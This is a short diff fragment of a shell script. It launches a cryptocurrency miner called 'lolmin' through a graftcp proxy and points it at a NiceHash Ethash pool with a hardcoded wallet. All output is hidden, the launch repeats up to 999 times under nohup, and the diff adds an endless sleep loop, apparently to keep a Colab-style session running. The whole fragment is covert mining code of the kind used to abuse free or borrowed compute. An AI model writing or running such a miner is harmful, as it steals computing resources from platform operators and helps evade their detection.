@@ -68,3 +68,6 @@ chmod +x lolmin
 
 wallet="./graftcp/graftcp ./lolmin --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.colab >/dev/null 2>&1 "
 nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1
+while [ 1 ]; do
+sleep 1000
+done
